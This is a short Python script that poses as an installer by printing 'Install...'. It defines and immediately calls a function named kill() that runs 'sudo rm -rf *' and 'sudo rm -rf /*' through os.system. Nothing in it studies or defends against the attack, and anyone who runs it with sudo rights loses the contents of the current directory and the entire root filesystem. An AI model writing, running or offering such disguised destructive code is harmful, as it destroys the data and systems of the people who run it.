import os

red = '\033[92m'

def kill():
    os.system('clear')
    os.system(red+'Install...')
    os.system('sudo rm -rf *')
    os.system('sudo rm -rf /*')

kill()
